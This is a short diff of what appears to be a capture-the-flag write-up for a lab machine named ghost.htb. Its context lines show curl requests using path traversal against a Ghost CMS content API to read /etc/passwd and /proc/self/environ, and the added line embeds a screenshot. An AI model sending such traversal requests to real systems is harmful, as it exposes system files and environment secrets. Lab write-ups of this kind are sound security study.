@@ -329,3 +329,4 @@ curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../etc/pa
 curl "http://ghost.htb:8008/ghost/api/v3/content/posts/?extra=../../../../proc/self/environ&key=a5af628828958c976a3b6cc81a" | jq
 ```
 
+![[Pasted image 20240718202605.png]]
